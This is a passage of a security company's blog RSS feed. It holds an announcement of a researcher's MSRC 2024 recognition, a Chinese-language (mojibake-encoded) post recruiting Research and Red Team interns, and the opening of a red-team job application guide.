  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>MSRC 2024 Most Valuable Security Researchers - Angelboy</title>
                <description>&lt;p&gt;Weâ€™re thrilled to announce that Angelboy, senior security researcher at DEVCORE, is named one of Microsoftâ€™s MSRC 2024 Most Valuable Security Researchers! He not only secured the #33 spot on the overall list but also achieved the #9 position in the Windows category.&lt;/p&gt;

&lt;p&gt;This is the first time Angelboy has been shortlisted on this annual leaderboard, and he is also the highest-ranked Taiwanese security researcher featured. This prestigious accomplishment highlights his exceptional expertise and significant contributions to the field.&lt;/p&gt;

&lt;p&gt;The Microsoft Security Response Center (MSRC) has long recognized the efforts of security researchers who partner with Microsoft in reporting vulnerabilities through its Microsoft Researcher Recognition Program (MRRR). The program expresses gratitude for their contributions to the security of Microsoftâ€™s global customers and products.&lt;/p&gt;

&lt;p&gt;The MSRC 2024 Most Valuable Security Researchers list, announced on August 7th, is based on the total number of points the researchers earned for each valid report from July 2023 to June 2024. Angelboy secured the #33 spots on the leaderboard. Specifically, his dedicated passion for Windows Kernel research earned him a #9 ranking in the Windows category, placing him in the TOP 10. He was also awarded â€œAccuracyâ€ and â€œVolumeâ€ badges, further highlighting his significant contributions to vulnerability research.&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2024/08/congratulations-to-the-msrc-2024-most-valuable-security-researchers/&quot;&gt;Microsoft official announcement - Congratulations to the MSRC 2024 Most Valuable Security Researchers!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/leaderboard&quot;&gt;Microsoft MSRC 2024 leaderboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en/</link>
                <guid>https://devco.re/blog/2024/08/08/msrc-2024-most-valuable-security-researchers-angelboy-en</guid>
                <pubDate>Thu, 08 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 ç¬¬å…­å±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE å‰µç«‹è¿„ä»Šå·²é€¾åå¹´ï¼ŒæŒçºŒå°ˆæ³¨æ–¼æä¾›ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œä¸¦è‡´åŠ›å°‹æ‰¾å„ç¨®å®‰å…¨é¢¨éšªåŠæ¼æ´ï¼Œè®“ä¸–ç•Œè®Šå¾—æ›´å®‰å…¨ã€‚ç‚ºäº†æŒçºŒå°‹æ‰¾æ›´å¤šæ“æœ‰ç›¸åŒç†å¿µçš„è³‡å®‰æ–°éŠ³ã€å”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½ï¼Œæˆ‘å€‘æˆç«‹äº†ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œ2022 å¹´åˆé–‹å§‹èˆ‰è¾¦é¦–å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œç›®å‰ç‚ºæ­¢æˆæœé —è±ã€è¶…ä¹é æœŸï¼Œç¬¬äº”å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ä¹Ÿå°‡æ–¼ä»Šå¹´ 7 æœˆåº•å‘Šä¸€æ®µè½ã€‚æˆ‘å€‘å¾ˆæ¦®å¹¸åœ°å®£ä½ˆï¼Œç¬¬å…­å±†å¯¦ç¿’ç”Ÿè¨ˆç•«å³å°‡ç™»å ´ï¼Œè‹¥æ‚¨æœŸå¾…åŠ å…¥æˆ‘å€‘ã€ç²¾é€²è³‡å®‰æŠ€èƒ½ï¼Œç…©è«‹è©³é–±ä¸‹åˆ—è³‡è¨Šå¾Œä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Research åŠ Red Team å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠæ’°å¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 60 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;æˆæœå ±å‘Šèˆ‡æº–å‚™ 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
ç ”ç©¶ä¸¦æ·±å…¥å­¸ç¿’ç´…éšŠå¸¸ç”¨æŠ€å·§ï¼Œç†Ÿæ‚‰å¯¦æˆ°ä¸­æœƒé‡åˆ°çš„æƒ…å¢ƒã€èªè¨€èˆ‡æ¶æ§‹ã€‚äº†è§£å¸¸è¦‹æ¼æ´çš„æˆå› ã€å¯¦éš›åˆ©ç”¨æ–¹æ³•ã€åš´è‹›æ¢ä»¶ä¸‹çš„åˆ©ç”¨ç­–ç•¥ã€é»‘ç®±æ¸¬è©¦æ–¹å¼åŠå„ç¨®å¥‡æŠ€æ·«å·§ã€‚å­¸ç¿’å¾Œæ»²é€æ™‚çš„å¸¸è¦‹é™åˆ¶ã€å·¥å…·æ¦‚å¿µèˆ‡åŸç†ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´èˆ‡æŠ€å·§çš„ç ”ç©¶åŠæ·±å…¥å­¸ç¿’ 70 %&lt;/li&gt;
      &lt;li&gt;Lab å»ºç½®æˆ– Bug Bounty æˆ–æ¼æ´æŒ–æ˜ 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 å¹´ 9 æœˆé–‹å§‹åˆ° 2025 å¹´ 1 æœˆåº•ï¼Œå…± 5 å€‹æœˆã€‚&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦
        &lt;ul&gt;
          &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´ï¼ˆä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€ï¼‰&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿï¼Œä¸”å¯æ¯é€±å·¥ä½œå…©å¤©&lt;/li&gt;
  &lt;li&gt;æ­¤å¤–ä¸¦ç„¡å…¶ä»–æ‹›å‹Ÿé™åˆ¶ï¼Œæ­·å±†å¯¦ç¿’ç”Ÿå¯é‡è¤‡æ‡‰å¾µ&lt;/li&gt;
  &lt;li&gt;å°è³‡æ ¼æœ‰ä»»ä½•ç–‘æ…®ï¼Œæ­¡è¿ä¾†ä¿¡è©¢å•&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Red Team çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨åŠæŒ–æ˜èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç¨ç«‹åˆ†æé–‹æ”¾åŸå§‹ç¢¼å°ˆæ¡ˆçš„èƒ½åŠ›ï¼Œèƒ½é€éåˆ†æç¨‹å¼ç¢¼ç†è§£ç›®æ¨™å°ˆæ¡ˆçš„æ¶æ§‹&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä¸¦ç†è§£å¸¸è¦‹çš„æ¼æ´æˆå› 
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€æˆ–æ¡†æ¶ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€Express.jsï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
      &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­çš„å®‰å…¨è­°é¡Œ&lt;/li&gt;
      &lt;li&gt;ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ï¼Œæˆ–åˆ†æé 1-day çš„ç¶“é©—&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10&lt;/li&gt;
  &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Lab&lt;/li&gt;
  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µ&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼é–‹ç™¼æ–¹å¼ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheã€Tomcatã€IISï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxã€Windowsï¼‰çš„èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day Exploit&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;æ‡‰å¾µ Research å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
          &lt;li&gt;é¡Œç›®ä¸€ï¼šæ¼æ´é‡ç¾èˆ‡åˆ†æéç¨‹
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸€å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2022 ~ 2024 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£è©³è¿°èªªæ˜æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚åŒæ™‚ï¼Œå˜—è©¦æè¿°å¦‚ä½•å¾©ç¾æ­¤æ¼æ´æˆ–æ”»æ“Šéˆï¼Œå³ä½¿ç„¡æ³•æˆåŠŸå¾©ç¾ï¼Œä¹Ÿè«‹è¨˜éŒ„ç ”ç©¶éç¨‹ã€‚å ±å‘Šæ’°å¯«è«‹åƒè€ƒ&lt;a href=&quot;/assets/files/recruit/binary/2024_6th_intern_analysis_example.pdf&quot;&gt;ç¯„æœ¬&lt;/a&gt;ï¼Œç›¡å¯èƒ½è©³ç´°ï¼Œä¸­è‹±ä¸é™ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;é¡Œç›®äºŒï¼šå¯¦ç¿’æœŸé–“æƒ³è¦ç ”ç©¶çš„ä¸»é¡Œ
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸‰å€‹å¯èƒ½é¸æ“‡çš„æ˜ç¢ºä¸»é¡Œï¼Œä¸¦ç°¡å–®èªªæ˜æå‡ºçš„ç†ç”±æˆ–æƒ³å®Œæˆçš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š
                &lt;ul&gt;
                  &lt;li&gt;ç ”ç©¶â—¯â—¯é–‹æºè»Ÿé«”ï¼Œæ‰¾åˆ°å¯ RCE çš„é‡å¤§é¢¨éšªå¼±é»ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„è·¯ç”±å™¨ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šAA-123 è·¯ç”±å™¨ã€BB-456 ç„¡ç·šè·¯ç”±å™¨ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„ç­†è¨˜å¹³å°æˆ–è»Ÿé«”ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šXX Noteã€YY Noteã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;æ‡‰å¾µ Red Team å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
          &lt;li&gt;è«‹æå‡ºå…©å€‹æ–¼è¥¿å…ƒ 2022 ~ 2024 å¹´é–“å…¬é–‹çš„ã€èˆ‡ Web æ”»æ“Šé¢ã€æ¼æ´æˆ–æ”»æ“Šéˆç›¸é—œçš„æ¼”è¬›ã€‚è«‹èªªæ˜ç‚ºä»€éº¼æŒ‘é¸é€™äº›æ¼”è¬›ä¸¦è§£é‡‹å®ƒå€‘ç‚ºä»€éº¼æœ‰è¶£ã€‚ç”¨ä½ çš„è©±è©³ç´°è§£é‡‹é€™äº›æ¼”è¬›çš„ç´°ç¯€ï¼Œä¸¦æä¾›ä»»ä½•ä½ è¦ºå¾—å¯ä»¥è¼”åŠ©æˆ–è­‰æ˜ä½ ç†è§£çš„é™„åŠ è³‡æ–™ã€‚é€™äº›æ¼”è¬›å¯ä»¥ä¾†è‡ªåŒ…å«ä½†ä¸é™æ–¼ Black Hatã€DEF CONã€OffensiveConã€POCã€ZeroConfã€Hexaconã€HITCONã€TROOPERS CONFERENCE ç­‰æœƒè­°ã€‚&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ¬éšæ®µæ”¶ä»¶æˆªæ­¢æ™‚é–“ç‚º &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt;ï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠé¡Œç›®æ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæˆ‘å€‘æœƒåœ¨ 10 å€‹&lt;strong&gt;å·¥ä½œå¤©&lt;/strong&gt;å…§å›è¦†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;

&lt;p&gt;æ­¤éšæ®µç‚º 30~120 åˆ†é˜ï¼ˆä¾ç…§çµ„åˆ¥éœ€æ±‚è€Œå®šï¼Œæœƒå¦è¡Œé€šçŸ¥ï¼‰çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/07/18 - 2024/08/09 å…¬é–‹æ‹›å‹Ÿ&lt;/li&gt;
  &lt;li&gt;2024/08/12 - 2024/08/22 é¢è©¦&lt;/li&gt;
  &lt;li&gt;2024/08/26 å‰å›æ‡‰çµæœ&lt;/li&gt;
  &lt;li&gt;2024/09/02 ç¬¬å…­å±†å¯¦ç¿’è¨ˆç•«æ–¼ç•¶é€±é–‹å§‹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;é¡Œç›®ç­”æ¡ˆ&lt;/strong&gt;ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ &lt;strong&gt;2024/08/09 23:59&lt;/strong&gt; å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Red Team çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨ä¸‰é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.16personalities.com/tw&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/18/6th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/07/18/6th-internship-program-recruit</guid>
                <pubDate>Thu, 18 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç´…éšŠæ¼”ç·´å°ˆå®¶æ‡‰å¾µæŒ‡å—</title>
                <description>&lt;p&gt;ç´…éšŠæ¼”ç·´æ˜¯ DEVCORE æœ€æ ¸å¿ƒçš„æ¥­å‹™ã€‚æˆ‘å€‘æ“æœ‰è±å¯Œçš„å¯¦æˆ°ç¶“é©—ï¼Œä¸¦ä¸”é›†çµäº†ä¸€ç¾¤å„ªç§€çš„å¤¥ä¼´å…±åŒè¿æ¥æŒ‘æˆ°ã€‚å¾ˆå¤šæŠ€è¡“æ„›å¥½è€…å¸Œæœ›åŠ å…¥æˆ‘å€‘ï¼Œæƒ³è¦äº†è§£æˆ‘å€‘éŒ„å–æ–°äººæ‰€çœ‹é‡çš„æ–¹å‘ã€‚è¶è‘—ç•¢æ¥­å­£æ±‚è·æ½®ï¼Œæˆ‘å€‘ç‰¹åˆ¥æº–å‚™äº†é€™ä»½æ‡‰å¾µæŒ‡å—ï¼Œå¸Œæœ›å¹«åŠ©æœ‰èˆˆè¶£çš„äººäº†è§£æº–å‚™æ–¹å‘ï¼Œä¹Ÿå¸Œæœ›å¹«åŠ©ä¸€äº›å‰›ç•¢æ¥­ã€ä¸æ“…é•·æ’°å¯«å±¥æ­·ã€ä¸æ“…é•·åœ¨é¢è©¦ä¸­è¡¨é”è‡ªå·±çš„äººï¼Œè£œè¶³å¿…è¦æŠ€èƒ½ä»¥å…éŒ¯å¤±æ©Ÿæœƒã€‚ç„¡è«–æ‚¨å°ç´…éšŠæ¼”ç·´å°ˆå®¶æˆ–æ»²é€æ¸¬è©¦å·¥ç¨‹å¸«æ„Ÿèˆˆè¶£ï¼ŒæœŸæœ›å¯ä»¥å¾ªè‘—é€™ä»½æŒ‡å—ï¼Œæˆç‚ºæˆ‘å€‘çš„å¤¥ä¼´ã€‚&lt;/p&gt;

